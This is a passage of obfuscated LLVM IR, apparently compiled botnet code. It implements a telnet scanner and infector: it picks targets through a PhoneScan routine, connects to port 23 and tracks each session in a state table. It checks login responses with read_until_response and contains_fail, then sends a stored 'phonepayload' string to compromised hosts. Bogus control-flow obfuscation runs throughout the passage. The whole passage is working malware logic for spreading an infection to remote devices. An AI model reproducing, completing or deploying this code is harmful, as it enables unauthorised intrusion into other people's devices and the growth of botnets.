  %1258 = load i32, i32* %1257, align 8
  %1259 = load i8*, i8** @phonepayload, align 8
  %1260 = load i8*, i8** @phonepayload, align 8
  %1261 = call i64 @strlen(i8* %1260) #9
  %1262 = call i64 @send(i32 %1258, i8* %1259, i64 %1261, i32 16384)
  %1263 = icmp slt i64 %1262, 0
  %1264 = load i32, i32* @x.95
  %1265 = load i32, i32* @y.96
  %1266 = sub i32 %1264, 1
  %1267 = mul i32 %1264, %1266
  %1268 = urem i32 %1267, 2
  %1269 = icmp eq i32 %1268, 0
  %1270 = icmp slt i32 %1265, 10
  %1271 = or i1 %1269, %1270
  br i1 %1271, label %originalBBpart2189, label %originalBB187alteredBB

originalBBpart2189:                               ; preds = %originalBB187
  br i1 %1263, label %1272, label %1287

; <label>:1272:                                   ; preds = %originalBBpart2189
  %1273 = load i32, i32* %2, align 4
  %1274 = sext i32 %1273 to i64
  %1275 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1274
  %1276 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1275, i32 0, i32 0
  %1277 = load i32, i32* %1276, align 8
  %1278 = call i32 @sclose(i32 %1277)
  %1279 = load i32, i32* %2, align 4
  %1280 = sext i32 %1279 to i64
  %1281 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1280
  %1282 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1281, i32 0, i32 3
  store i8 0, i8* %1282, align 4
  %1283 = load i32, i32* %2, align 4
  %1284 = sext i32 %1283 to i64
  %1285 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1284
  %1286 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1285, i32 0, i32 4
  store i8 1, i8* %1286, align 1
  br label %1353

; <label>:1287:                                   ; preds = %originalBBpart2189
  %1288 = load i32, i32* %2, align 4
  %1289 = sext i32 %1288 to i64
  %1290 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1289
  %1291 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1290, i32 0, i32 4
  store i8 3, i8* %1291, align 1
  %1292 = load i32, i32* %2, align 4
  %1293 = sext i32 %1292 to i64
  %1294 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1293
  %1295 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1294, i32 0, i32 9
  %1296 = load i32, i32* %1295, align 8
  %1297 = add i32 %1296, 60
  %1298 = zext i32 %1297 to i64
  %1299 = call i64 @time(i64* null) #5
  %1300 = icmp slt i64 %1298, %1299
  br i1 %1300, label %1301, label %1335

; <label>:1301:                                   ; preds = %1287
  %1302 = load i32, i32* %2, align 4
  %1303 = sext i32 %1302 to i64
  %1304 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1303
  %1305 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1304, i32 0, i32 4
  %1306 = load i8, i8* %1305, align 1
  %1307 = zext i8 %1306 to i32
  %1308 = icmp ne i32 %1307, 3
  br i1 %1308, label %1309, label %1326

; <label>:1309:                                   ; preds = %1301
  %1310 = load i32, i32* @x.95
  %1311 = load i32, i32* @y.96
  %1312 = sub i32 %1310, 1
  %1313 = mul i32 %1310, %1312
  %1314 = urem i32 %1313, 2
  %1315 = icmp eq i32 %1314, 0
  %1316 = icmp slt i32 %1311, 10
  %1317 = or i1 %1315, %1316
  br i1 %1317, label %originalBB191, label %originalBB191alteredBB

originalBB191:                                    ; preds = %originalBB191alteredBB, %1309
  %1318 = load i32, i32* @x.95
  %1319 = load i32, i32* @y.96
  %1320 = sub i32 %1318, 1
  %1321 = mul i32 %1318, %1320
  %1322 = urem i32 %1321, 2
  %1323 = icmp eq i32 %1322, 0
  %1324 = icmp slt i32 %1319, 10
  %1325 = or i1 %1323, %1324
  br i1 %1325, label %originalBBpart2193, label %originalBB191alteredBB

originalBBpart2193:                               ; preds = %originalBB191
  br label %1326

; <label>:1326:                                   ; preds = %originalBBpart2193, %1301
  %1327 = load i32, i32* %2, align 4
  %1328 = sext i32 %1327 to i64
  %1329 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1328
  %1330 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1329, i32 0, i32 3
  store i8 0, i8* %1330, align 4
  %1331 = load i32, i32* %2, align 4
  %1332 = sext i32 %1331 to i64
  %1333 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1332
  %1334 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1333, i32 0, i32 4
  store i8 1, i8* %1334, align 1
  br label %1335

; <label>:1335:                                   ; preds = %1326, %1287
  %1336 = load i32, i32* @x.95
  %1337 = load i32, i32* @y.96
  %1338 = sub i32 %1336, 1
  %1339 = mul i32 %1336, %1338
  %1340 = urem i32 %1339, 2
  %1341 = icmp eq i32 %1340, 0
  %1342 = icmp slt i32 %1337, 10
  %1343 = or i1 %1341, %1342
  br i1 %1343, label %originalBB195, label %originalBB195alteredBB

originalBB195:                                    ; preds = %originalBB195alteredBB, %1335
  %1344 = load i32, i32* @x.95
  %1345 = load i32, i32* @y.96
  %1346 = sub i32 %1344, 1
  %1347 = mul i32 %1344, %1346
  %1348 = urem i32 %1347, 2
  %1349 = icmp eq i32 %1348, 0
  %1350 = icmp slt i32 %1345, 10
  %1351 = or i1 %1349, %1350
  br i1 %1351, label %originalBBpart2197, label %originalBB195alteredBB

originalBBpart2197:                               ; preds = %originalBB195
  br label %1352

; <label>:1352:                                   ; preds = %originalBBpart2197, %1234, %originalBBpart2181, %originalBBpart2165, %originalBBpart2161, %860, %originalBBpart2141, %originalBBpart2125, %672, %originalBBpart2109, %332, %162
  br label %1353

; <label>:1353:                                   ; preds = %1352, %1272, %originalBBpart2185, %originalBBpart2173, %1055, %originalBBpart2153, %851, %790, %697, %652, %515, %originalBBpart294, %253
  %1354 = load i32, i32* @x.95
  %1355 = load i32, i32* @y.96
  %1356 = sub i32 %1354, 1
  %1357 = mul i32 %1354, %1356
  %1358 = urem i32 %1357, 2
  %1359 = icmp eq i32 %1358, 0
  %1360 = icmp slt i32 %1355, 10
  %1361 = or i1 %1359, %1360
  br i1 %1361, label %originalBB199, label %originalBB199alteredBB

originalBB199:                                    ; preds = %originalBB199alteredBB, %1353
  %1362 = load i32, i32* %2, align 4
  %1363 = add nsw i32 %1362, 1
  store i32 %1363, i32* %2, align 4
  %1364 = load i32, i32* @x.95
  %1365 = load i32, i32* @y.96
  %1366 = sub i32 %1364, 1
  %1367 = mul i32 %1364, %1366
  %1368 = urem i32 %1367, 2
  %1369 = icmp eq i32 %1368, 0
  %1370 = icmp slt i32 %1365, 10
  %1371 = or i1 %1369, %1370
  br i1 %1371, label %originalBBpart2215, label %originalBB199alteredBB

originalBBpart2215:                               ; preds = %originalBB199
  br label %128

; <label>:1372:                                   ; preds = %originalBBpart216
  br label %94
                                                  ; No predecessors!
  %1374 = load i32, i32* @x.95
  %1375 = load i32, i32* @y.96
  %1376 = sub i32 %1374, 1
  %1377 = mul i32 %1374, %1376
  %1378 = urem i32 %1377, 2
  %1379 = icmp eq i32 %1378, 0
  %1380 = icmp slt i32 %1375, 10
  %1381 = or i1 %1379, %1380
  br i1 %1381, label %originalBB217, label %originalBB217alteredBB

originalBB217:                                    ; preds = %originalBB217alteredBB, %1373
  %1382 = load i32, i32* @x.95
  %1383 = load i32, i32* @y.96
  %1384 = sub i32 %1382, 1
  %1385 = mul i32 %1382, %1384
  %1386 = urem i32 %1385, 2
  %1387 = icmp eq i32 %1386, 0
  %1388 = icmp slt i32 %1383, 10
  %1389 = or i1 %1387, %1388
  br i1 %1389, label %originalBBpart2219, label %originalBB217alteredBB

originalBBpart2219:                               ; preds = %originalBB217
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %58
  %1390 = load i32, i32* %2, align 4
  %_ = shl i32 %1390, 1
  %_1 = sub i32 0, %1390
  %gen = add i32 %_1, 1
  %1391 = add nsw i32 %1390, 1
  store i32 %1391, i32* %2, align 4
  br label %originalBB

originalBB2alteredBB:                             ; preds = %originalBB2, %77
  br label %originalBB2

originalBB6alteredBB:                             ; preds = %originalBB6, %94
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %111
  store i32 0, i32* %2, align 4
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %128
  %1392 = load i32, i32* %2, align 4
  %1393 = load i32, i32* %6, align 4
  %1394 = icmp slt i32 %1392, %1393
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %177
  %1395 = load i32, i32* %2, align 4
  %1396 = sext i32 %1395 to i64
  %1397 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1396
  %1398 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1397, i32 0, i32 11
  %1399 = load i8*, i8** %1398, align 8
  store i8* %1399, i8** %16, align 8
  %1400 = load i32, i32* %2, align 4
  %1401 = sext i32 %1400 to i64
  %1402 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1401
  %1403 = bitcast %struct.telstate_t* %1402 to i8*
  call void @llvm.memset.p0i8.i64(i8* %1403, i8 0, i64 40, i32 8, i1 false)
  %1404 = load i8*, i8** %16, align 8
  %1405 = load i32, i32* %2, align 4
  %1406 = sext i32 %1405 to i64
  %1407 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1406
  %1408 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1407, i32 0, i32 11
  store i8* %1404, i8** %1408, align 8
  %1409 = call i32 @PhoneScan()
  %1410 = load i32, i32* %2, align 4
  %1411 = sext i32 %1410 to i64
  %1412 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1411
  %1413 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1412, i32 0, i32 2
  store i32 %1409, i32* %1413, align 8
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %213
  %1414 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 0
  store i16 2, i16* %1414, align 4
  %1415 = call zeroext i16 @htons(i16 zeroext 23) #10
  %1416 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 1
  store i16 %1415, i16* %1416, align 2
  %1417 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 3
  %1418 = getelementptr inbounds [8 x i8], [8 x i8]* %1417, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %1418, i8 0, i64 8, i32 4, i1 false)
  %1419 = load i32, i32* %2, align 4
  %1420 = sext i32 %1419 to i64
  %1421 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1420
  %1422 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1421, i32 0, i32 2
  %1423 = load i32, i32* %1422, align 8
  %1424 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 2
  %1425 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %1424, i32 0, i32 0
  store i32 %1423, i32* %1425, align 4
  %1426 = call i32 @socket(i32 2, i32 1, i32 0) #5
  %1427 = load i32, i32* %2, align 4
  %1428 = sext i32 %1427 to i64
  %1429 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1428
  %1430 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1429, i32 0, i32 0
  store i32 %1426, i32* %1430, align 8
  %1431 = load i32, i32* %2, align 4
  %1432 = sext i32 %1431 to i64
  %1433 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1432
  %1434 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1433, i32 0, i32 0
  %1435 = load i32, i32* %1434, align 8
  %1436 = icmp eq i32 %1435, -1
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %276
  %1437 = call i32* @__errno_location() #10
  %1438 = load i32, i32* %1437, align 4
  %1439 = icmp ne i32 %1438, 115
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %296
  %1440 = load i32, i32* %2, align 4
  %1441 = sext i32 %1440 to i64
  %1442 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1441
  %1443 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1442, i32 0, i32 0
  %1444 = load i32, i32* %1443, align 8
  %1445 = call i32 @sclose(i32 %1444)
  %1446 = load i32, i32* %2, align 4
  %1447 = sext i32 %1446 to i64
  %1448 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1447
  %1449 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1448, i32 0, i32 4
  store i8 1, i8* %1449, align 1
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %343
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %360
  %1450 = load i32, i32* %2, align 4
  %1451 = sext i32 %1450 to i64
  %1452 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1451
  %1453 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1452, i32 0, i32 0
  %1454 = load i32, i32* %1453, align 8
  %_39 = sub i32 0, %1454
  %gen40 = add i32 %_39, 64
  %1455 = srem i32 %1454, 64
  %1456 = zext i32 %1455 to i64
  %_41 = sub i64 1, %1456
  %gen42 = mul i64 %_41, %1456
  %1457 = shl i64 1, %1456
  %1458 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %9, i32 0, i32 0
  %1459 = load i32, i32* %2, align 4
  %1460 = sext i32 %1459 to i64
  %1461 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1460
  %1462 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1461, i32 0, i32 0
  %1463 = load i32, i32* %1462, align 8
  %_43 = shl i32 %1463, 64
  %_44 = sub i32 %1463, 64
  %gen45 = mul i32 %_44, 64
  %_46 = sub i32 %1463, 64
  %gen47 = mul i32 %_46, 64
  %_48 = sub i32 0, %1463
  %gen49 = add i32 %_48, 64
  %1464 = sdiv i32 %1463, 64
  %1465 = sext i32 %1464 to i64
  %1466 = getelementptr inbounds [16 x i64], [16 x i64]* %1458, i64 0, i64 %1465
  %1467 = load i64, i64* %1466, align 8
  %_50 = sub i64 0, %1467
  %gen51 = add i64 %_50, %1457
  %_52 = shl i64 %1467, %1457
  %_53 = sub i64 0, %1467
  %gen54 = add i64 %_53, %1457
  %1468 = or i64 %1467, %1457
  store i64 %1468, i64* %1466, align 8
  %1469 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i32 0, i32 0
  store i64 0, i64* %1469, align 8
  %1470 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i32 0, i32 1
  store i64 10000, i64* %1470, align 8
  %1471 = load i32, i32* %2, align 4
  %1472 = sext i32 %1471 to i64
  %1473 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1472
  %1474 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1473, i32 0, i32 0
  %1475 = load i32, i32* %1474, align 8
  %_55 = sub i32 %1475, 1
  %gen56 = mul i32 %_55, 1
  %_57 = sub i32 %1475, 1
  %gen58 = mul i32 %_57, 1
  %_59 = shl i32 %1475, 1
  %_60 = shl i32 %1475, 1
  %_61 = sub i32 0, %1475
  %gen62 = add i32 %_61, 1
  %_63 = sub i32 %1475, 1
  %gen64 = mul i32 %_63, 1
  %_65 = shl i32 %1475, 1
  %_66 = sub i32 0, %1475
  %gen67 = add i32 %_66, 1
  %_68 = shl i32 %1475, 1
  %1476 = add nsw i32 %1475, 1
  %1477 = call i32 @select(i32 %1476, %struct.fd_set* null, %struct.fd_set* %9, %struct.fd_set* null, %struct.timeval* %10)
  store i32 %1477, i32* %3, align 4
  %1478 = load i32, i32* %3, align 4
  %1479 = icmp eq i32 %1478, 1
  br label %originalBB38

originalBB72alteredBB:                            ; preds = %originalBB72, %432
  %1480 = load i32, i32* %2, align 4
  %1481 = sext i32 %1480 to i64
  %1482 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1481
  %1483 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1482, i32 0, i32 0
  %1484 = load i32, i32* %1483, align 8
  %1485 = load i32, i32* %2, align 4
  %1486 = sext i32 %1485 to i64
  %1487 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1486
  %1488 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1487, i32 0, i32 0
  %1489 = load i32, i32* %1488, align 8
  %1490 = call i32 (i32, i32, ...) @fcntl(i32 %1489, i32 3, i8* null)
  %_73 = sub i32 0, %1490
  %gen74 = add i32 %_73, -2049
  %_75 = sub i32 0, %1490
  %gen76 = add i32 %_75, -2049
  %_77 = sub i32 0, %1490
  %gen78 = add i32 %_77, -2049
  %_79 = shl i32 %1490, -2049
  %_80 = sub i32 0, %1490
  %gen81 = add i32 %_80, -2049
  %_82 = sub i32 %1490, -2049
  %gen83 = mul i32 %_82, -2049
  %_84 = sub i32 0, %1490
  %gen85 = add i32 %_84, -2049
  %_86 = sub i32 0, %1490
  %gen87 = add i32 %_86, -2049
  %_88 = shl i32 %1490, -2049
  %1491 = and i32 %1490, -2049
  %1492 = call i32 (i32, i32, ...) @fcntl(i32 %1484, i32 4, i32 %1491)
  %1493 = load i32, i32* %2, align 4
  %1494 = sext i32 %1493 to i64
  %1495 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1494
  %1496 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1495, i32 0, i32 9
  store i32 0, i32* %1496, align 8
  %1497 = load i32, i32* %2, align 4
  %1498 = sext i32 %1497 to i64
  %1499 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1498
  %1500 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1499, i32 0, i32 10
  store i16 0, i16* %1500, align 4
  %1501 = load i32, i32* %2, align 4
  %1502 = sext i32 %1501 to i64
  %1503 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1502
  %1504 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1503, i32 0, i32 11
  %1505 = load i8*, i8** %1504, align 8
  call void @llvm.memset.p0i8.i64(i8* %1505, i8 0, i64 253, i32 1, i1 false)
  %1506 = load i32, i32* %2, align 4
  %1507 = sext i32 %1506 to i64
  %1508 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1507
  %1509 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1508, i32 0, i32 3
  store i8 2, i8* %1509, align 4
  br label %originalBB72

originalBB92alteredBB:                            ; preds = %originalBB92, %479
  br label %originalBB92

originalBB96alteredBB:                            ; preds = %originalBB96, %496
  %1510 = load i32, i32* %3, align 4
  %1511 = icmp eq i32 %1510, -1
  br label %originalBB96

originalBB100alteredBB:                           ; preds = %originalBB100, %531
  %1512 = load i32, i32* %2, align 4
  %1513 = sext i32 %1512 to i64
  %1514 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1513
  %1515 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1514, i32 0, i32 9
  %1516 = load i32, i32* %1515, align 8
  %_101 = shl i32 %1516, 6
  %_102 = sub i32 %1516, 6
  %gen103 = mul i32 %_102, 6
  %1517 = add i32 %1516, 6
  %1518 = zext i32 %1517 to i64
  %1519 = call i64 @time(i64* null) #5
  %1520 = icmp slt i64 %1518, %1519
  br label %originalBB100

originalBB107alteredBB:                           ; preds = %originalBB107, %572
  br label %originalBB107

originalBB111alteredBB:                           ; preds = %originalBB111, %589
  %1521 = load i32, i32* %2, align 4
  %1522 = sext i32 %1521 to i64
  %1523 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1522
  %1524 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1523, i32 0, i32 0
  %1525 = load i32, i32* %1524, align 8
  %1526 = load i32, i32* %2, align 4
  %1527 = sext i32 %1526 to i64
  %1528 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1527
  %1529 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1528, i32 0, i32 11
  %1530 = load i8*, i8** %1529, align 8
  %1531 = call i32 @read_until_response(i32 %1525, i32 10000, i8* %1530, i32 253, i8** getelementptr inbounds ([7 x i8*], [7 x i8*]* @phone, i32 0, i32 0))
  %1532 = icmp ne i32 %1531, 0
  br label %originalBB111

originalBB115alteredBB:                           ; preds = %originalBB115, %618
  %1533 = load i32, i32* %2, align 4
  %1534 = sext i32 %1533 to i64
  %1535 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1534
  %1536 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1535, i32 0, i32 11
  %1537 = load i8*, i8** %1536, align 8
  %1538 = call i32 @contains_fail(i8* %1537)
  %1539 = icmp ne i32 %1538, 0
  br label %originalBB115

originalBB119alteredBB:                           ; preds = %originalBB119, %673
  %1540 = load i32, i32* %2, align 4
  %1541 = sext i32 %1540 to i64
  %1542 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1541
  %1543 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1542, i32 0, i32 0
  %1544 = load i32, i32* %1543, align 8
  %1545 = call i64 @send(i32 %1544, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.863, i32 0, i32 0), i64 7, i32 16384)
  %1546 = icmp slt i64 %1545, 0
  br label %originalBB119

originalBB123alteredBB:                           ; preds = %originalBB123, %706
  %1547 = load i32, i32* %2, align 4
  %1548 = sext i32 %1547 to i64
  %1549 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1548
  %1550 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1549, i32 0, i32 3
  store i8 4, i8* %1550, align 4
  br label %originalBB123

originalBB127alteredBB:                           ; preds = %originalBB127, %740
  %1551 = load i32, i32* %2, align 4
  %1552 = sext i32 %1551 to i64
  %1553 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1552
  %1554 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1553, i32 0, i32 11
  %1555 = load i8*, i8** %1554, align 8
  %1556 = call i32 @contains_fail(i8* %1555)
  %1557 = icmp ne i32 %1556, 0
  br label %originalBB127

originalBB131alteredBB:                           ; preds = %originalBB131, %769
  %1558 = load i32, i32* %2, align 4
  %1559 = sext i32 %1558 to i64
  %1560 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1559
  %1561 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1560, i32 0, i32 3
  store i8 5, i8* %1561, align 4
  br label %originalBB131

originalBB135alteredBB:                           ; preds = %originalBB135, %801
  %1562 = load i32, i32* %2, align 4
  %1563 = sext i32 %1562 to i64
  %1564 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1563
  %1565 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1564, i32 0, i32 3
  store i8 0, i8* %1565, align 4
  %1566 = load i32, i32* %2, align 4
  %1567 = sext i32 %1566 to i64
  %1568 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1567
  %1569 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1568, i32 0, i32 4
  store i8 1, i8* %1569, align 1
  br label %originalBB135

originalBB139alteredBB:                           ; preds = %originalBB139, %826
  br label %originalBB139

originalBB143alteredBB:                           ; preds = %originalBB143, %878
  %1570 = call i64 @time(i64* null) #5
  %1571 = trunc i64 %1570 to i32
  %1572 = load i32, i32* %2, align 4
  %1573 = sext i32 %1572 to i64
  %1574 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1573
  %1575 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1574, i32 0, i32 9
  store i32 %1571, i32* %1575, align 8
  %1576 = load i32, i32* %2, align 4
  %1577 = sext i32 %1576 to i64
  %1578 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1577
  %1579 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1578, i32 0, i32 11
  %1580 = load i8*, i8** %1579, align 8
  %1581 = call i32 @contains_fail(i8* %1580)
  %1582 = icmp ne i32 %1581, 0
  br label %originalBB143

originalBB147alteredBB:                           ; preds = %originalBB147, %908
  %1583 = load i32, i32* %2, align 4
  %1584 = sext i32 %1583 to i64
  %1585 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1584
  %1586 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1585, i32 0, i32 3
  store i8 0, i8* %1586, align 4
  br label %originalBB147

originalBB151alteredBB:                           ; preds = %originalBB151, %978
  br label %originalBB151

originalBB155alteredBB:                           ; preds = %originalBB155, %1005
  %1587 = load i32, i32* %2, align 4
  %1588 = sext i32 %1587 to i64
  %1589 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1588
  %1590 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1589, i32 0, i32 3
  store i8 0, i8* %1590, align 4
  %1591 = load i32, i32* %2, align 4
  %1592 = sext i32 %1591 to i64
  %1593 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1592
  %1594 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1593, i32 0, i32 4
  store i8 1, i8* %1594, align 1
  br label %originalBB155

originalBB159alteredBB:                           ; preds = %originalBB159, %1030
  br label %originalBB159

originalBB163alteredBB:                           ; preds = %originalBB163, %1064
  %1595 = load i32, i32* %2, align 4
  %1596 = sext i32 %1595 to i64
  %1597 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1596
  %1598 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1597, i32 0, i32 3
  store i8 8, i8* %1598, align 4
  br label %originalBB163

originalBB167alteredBB:                           ; preds = %originalBB167, %1085
  %1599 = load i32, i32* %2, align 4
  %1600 = sext i32 %1599 to i64
  %1601 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1600
  %1602 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1601, i32 0, i32 0
  %1603 = load i32, i32* %1602, align 8
  %1604 = load i32, i32* %2, align 4
  %1605 = sext i32 %1604 to i64
  %1606 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1605
  %1607 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1606, i32 0, i32 11
  %1608 = load i8*, i8** %1607, align 8
  %1609 = call i32 @read_until_response(i32 %1603, i32 10000, i8* %1608, i32 253, i8** getelementptr inbounds ([7 x i8*], [7 x i8*]* @phone, i32 0, i32 0))
  %1610 = icmp ne i32 %1609, 0
  br label %originalBB167

originalBB171alteredBB:                           ; preds = %originalBB171, %1132
  br label %originalBB171

originalBB175alteredBB:                           ; preds = %originalBB175, %1159
  %1611 = load i32, i32* %2, align 4
  %1612 = sext i32 %1611 to i64
  %1613 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1612
  %1614 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1613, i32 0, i32 3
  store i8 0, i8* %1614, align 4
  %1615 = load i32, i32* %2, align 4
  %1616 = sext i32 %1615 to i64
  %1617 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1616
  %1618 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1617, i32 0, i32 4
  store i8 1, i8* %1618, align 1
  br label %originalBB175

originalBB179alteredBB:                           ; preds = %originalBB179, %1184
  br label %originalBB179

originalBB183alteredBB:                           ; preds = %originalBB183, %1209
  %1619 = load i32, i32* %2, align 4
  %1620 = sext i32 %1619 to i64
  %1621 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1620
  %1622 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1621, i32 0, i32 3
  store i8 0, i8* %1622, align 4
  %1623 = load i32, i32* %2, align 4
  %1624 = sext i32 %1623 to i64
  %1625 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1624
  %1626 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1625, i32 0, i32 4
  store i8 1, i8* %1626, align 1
  br label %originalBB183

originalBB187alteredBB:                           ; preds = %originalBB187, %1239
  %1627 = call i64 @time(i64* null) #5
  %1628 = trunc i64 %1627 to i32
  %1629 = load i32, i32* %2, align 4
  %1630 = sext i32 %1629 to i64
  %1631 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1630
  %1632 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1631, i32 0, i32 9
  store i32 %1628, i32* %1632, align 8
  %1633 = load i32, i32* %2, align 4
  %1634 = sext i32 %1633 to i64
  %1635 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1634
  %1636 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1635, i32 0, i32 0
  %1637 = load i32, i32* %1636, align 8
  %1638 = load i8*, i8** @phonepayload, align 8
  %1639 = load i8*, i8** @phonepayload, align 8
  %1640 = call i64 @strlen(i8* %1639) #9
  %1641 = call i64 @send(i32 %1637, i8* %1638, i64 %1640, i32 16384)
  %1642 = icmp slt i64 %1641, 0
  br label %originalBB187

originalBB191alteredBB:                           ; preds = %originalBB191, %1309
  br label %originalBB191

originalBB195alteredBB:                           ; preds = %originalBB195, %1335
  br label %originalBB195

